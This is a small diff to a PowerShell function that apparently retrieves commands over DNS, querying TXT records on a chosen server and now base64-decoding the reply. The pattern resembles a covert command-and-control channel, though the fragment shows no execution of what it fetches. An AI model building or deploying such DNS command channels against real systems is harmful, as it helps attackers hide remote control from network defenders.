@@ -59,6 +59,11 @@ function Get-CommandDetails {
         [string]$stringOffset = $currentOffset 
         $queryString = "a.$stringOffset.$commandID.$random.$domain"
         $response = (Resolve-DnsName -Name $queryString -Server $dnsAddr -Type TXT).Strings
+
+        $response = $response -join ""
+        # decode response from base64
+        $response = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($response))
+
         $response = $response | ConvertFrom-Json
 
         Write-Host "Response: $response"
